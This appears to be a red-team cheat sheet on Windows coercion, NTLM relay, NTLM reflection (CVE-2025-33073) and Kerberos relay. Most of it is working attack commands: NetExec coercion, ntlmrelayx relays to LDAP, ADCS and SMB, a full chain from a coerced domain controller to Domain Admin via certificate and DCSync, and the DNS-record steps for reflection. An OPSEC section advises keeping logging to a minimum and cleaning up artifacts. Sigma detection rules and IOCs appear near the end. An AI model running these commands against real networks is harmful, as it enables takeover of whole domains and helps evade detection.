# Coercion, NTLM Relay, NTLM Reflection & Kerberos Relay

ATT&CK: T1187 (Forced Authentication), T1557.001 (LLMNR/NBT-NS Poisoning & SMB Relay),
T1557 (Adversary-in-the-Middle). CWE-294 (Authentication Bypass by Capture-Replay),
CWE-287 (Improper Authentication).

## Theory / Mechanism

Coercion abuses RPC "features" that make a Windows host authenticate (as its **machine account**,
i.e. NT AUTHORITY\SYSTEM context) to an attacker-controlled UNC/HTTP path. The captured
authentication is then **relayed** to a third service that the victim is privileged on. Relay
targets: SMB (exec if signing off), LDAP/LDAPS (RBCD or shadow creds), ADCS HTTP (ESC8 → cert).

**Why relay (not crack):** machine-account Net-NTLM hashes are random 120-char passwords — uncrackable.
Relay uses the live authentication instead.

## Modern 2024-2026 variants (verified)

- **NTLM reflection — CVE-2025-33073 (patched 2025-06-10, disclosed by RedTeam Pentesting)**:
  reflect a coerced SMB/Kerberos auth *back to the same host* to gain **SYSTEM**. Works because a
  crafted AD-integrated DNS A record `<victim>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAA → attacker_IP`
  abuses `CredUnmarshalTargetInfo`: the SPN check uses only `<victim>`, but the network connection
  uses the full (marshalled) name pointing at the attacker. Requires target `signing:False`.
  Especially lethal on **unconstrained delegation** hosts: SYSTEM → coerce DC → cache DC$ TGT → DCSync.
- **Kerberos relay via DNS CNAME — CVE-2026-20929 (reported patched Jan 2026; UNVERIFIED — post-dates this guide's sources, confirm against MSRC before relying on the CVE id)**: Windows Kerberos clients
  follow CNAME when building the SPN for the TGS request. Combined with the fact many services accept
  a TGS issued for only the DNS part of an SPN (SMB accepts HTTP-class, HTTP accepts CIFS-class),
  this enables **cross-protocol Kerberos relay**. Fix: HTTP.sys CBT backport.
- **NTLM removal**: NTLMv1 fully removed in Win11 24H2 / Server 2025 → coercion increasingly returns
  *Kerberos*, so Kerberos relay (krbrelayx, KrbRelayEx) becomes the primary path.
- **ShadowCoerce patched**; PetitPotam/DFSCoerce/PrinterBug/MS-EVEN remain "by design".
- **NetExec `coerce_plus`** unifies all 5 methods; `efsr_spray` triggers WebDAV/HTTP coercion by
  creating an encrypted file on writable shares (only SMB WRITE needed, not NTFS perms).

## Complete working commands

### Check signing / relayability
```bash
nxc smb 10.0.0.0/24 --gen-relay-list relayable.txt    # hosts with SMB signing NOT required
nxc ldap <DC_IP> -u user -p 'Pass' -M ldap-checker     # LDAP/LDAPS signing & channel binding
```

### Coercion (NetExec coerce_plus, unified)
```bash
# Detect (listener defaults to localhost = no network traffic)
nxc smb <TARGET> -u user -p 'Pass' -M coerce_plus
# Fire a specific method at a relay listener
nxc smb <TARGET> -u user -p 'Pass' -M coerce_plus -o LISTENER=<RELAY_IP> METHOD=petitpotam
nxc smb <TARGET> -u user -p 'Pass' -M coerce_plus -o L=<RELAY_IP> M=dfscoerce ALWAYS=true
# WebDAV/HTTP coercion via encrypted-file spray
nxc smb <TARGET> -u user -p 'Pass' -M efsr_spray -o LISTENER=<RELAY_IP>
```
Classic standalone tools (still valid): `PetitPotam.py`, `dfscoerce.py`, `printerbug.py`,
`coercer coerce -t <TARGET> -l <RELAY_IP> -u user -p 'Pass' -d corp.local`.

### NTLM relay targets
```bash
# Relay to LDAP -> RBCD (drops a machine acct) or shadow credentials
impacket-ntlmrelayx -t ldaps://dc01.corp.local --delegate-access --no-smb-server -smb2support
impacket-ntlmrelayx -t ldaps://dc01.corp.local --shadow-credentials --shadow-target 'TARGET$'
# Relay to ADCS HTTP (ESC8) -> certificate as victim machine account
impacket-ntlmrelayx -t http://ca01.corp.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
# Relay to SMB (exec, only if target signing off)
impacket-ntlmrelayx -tf relayable.txt -smb2support -c 'whoami'
```

### Full chain: coerce DC → relay to ADCS ESC8 → DA
```bash
# Terminal 1
impacket-ntlmrelayx -t http://ca01.corp.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
# Terminal 2
nxc smb <DC_IP> -u user -p 'Pass' -M coerce_plus -o LISTENER=<RELAY_IP> METHOD=petitpotam
# Terminal 3 (after cert captured)
certipy auth -pfx dc01.pfx -dc-ip <DC_IP>      # DC$ TGT/NT hash -> DCSync -> Domain Admin
```
> `scripts/coerce_relay_chain.sh` wires this up (ldap / adcs / smb modes).

### NTLM reflection (CVE-2025-33073, unpatched + signing:False target)
```bash
# 1. Add the marshalled DNS record (any domain user can write AD-DNS)
python3 dnstool.py -u 'corp\user' -p 'Pass' --action add \
  --record '<victim>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAA' --data <ATTACKER_IP> --type A <DC_IP>
# 2. Reflective relay (krbrelayx modified to advertise NO NTLM, forcing Kerberos), or PoC:
#    github.com/mverschu/CVE-2025-33073 automates DNS + coercion + ntlmrelayx
nxc smb <TARGET> -M coerce_plus -o LISTENER='<victim>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAA'
# Result: SYSTEM on <victim>; dump SAM:  impacket-secretsdump -sam ... LOCAL
```

### Kerberos relay (krbrelayx, no NTLM available)
```bash
# Capture coerced Kerberos AP-REQ and relay to LDAP for RBCD
krbrelayx.py --target ldap://dc01.corp.local --victim TARGET$ --rbcd EVIL$
# DNS-poison path: mitm6 + krbrelayx
mitm6 -d corp.local
```

## Detection

```yaml
title: Coercion via EFSRPC / DFSNM / Spoolss Named Pipe
logsource: { product: windows, service: security }
detection:
  pipe: { EventID: 5145, ShareName: '\\*\IPC$', RelativeTargetName: ['lsarpc','efsrpc','netdfs','spoolss','fssagentrpc'] }
  condition: pipe
level: medium
---
title: Possible NTLM Reflection (CVE-2025-33073) - Marshalled DNS / self logon
logsource: { product: windows, service: security }
detection:
  sel: { EventID: 4624, LogonType: 3, AuthenticationPackageName: 'NTLM' }
  self: { WorkstationName: '%Computername%' }       # logon sourced from self
  condition: sel and self
level: high
```
IOCs: AD-integrated DNS A record containing `UWhRCAAAA...` marshalled blob; machine account
authenticating to a non-server workstation IP; `certsrv/certfnsh.asp` POST from a DC; new computer
account + `msDS-AllowedToActOnBehalfOfOtherIdentity` write right after a coercion event.

## OPSEC

- Coercion is "by design" but RPC firewall (RpcFilter) and EDR log the named-pipe call — fire the
  minimum methods (`coerce_plus` stops on first success unless `ALWAYS=true`).
- Relay to LDAP creates a machine account / shadow cred → clean up (`rbcd -action flush`, delete cert,
  remove KeyCredentialLink).
- CVE-2025-33073 needs the **marshalled DNS record removed** afterward (it persists in AD DNS).
- Prefer LDAPS relay (channel-binding permitting) over SMB exec to avoid service-creation artifacts.
- Patch reality: confirm targets are `signing:False` and (for reflection) un-patched < Jun 2025.

## References
- RedTeam Pentesting — "A Look in the Mirror: The Reflective Kerberos Relay Attack" (CVE-2025-33073)
- Synacktiv — "NTLM reflection is dead, long live NTLM reflection" (x33fcon 2025 whitepaper)
- CrowdStrike — "Detecting CVE-2026-20929: Kerberos Relay via DNS CNAME Abuse" (UNVERIFIED source — confirm before citing)
- Pennyw0rth/NetExec — `coerce_plus`, `efsr_spray` modules; mverschu/CVE-2025-33073 PoC
- RedTeam Pentesting — "The Ultimate Guide to Windows Coercion Techniques in 2025"
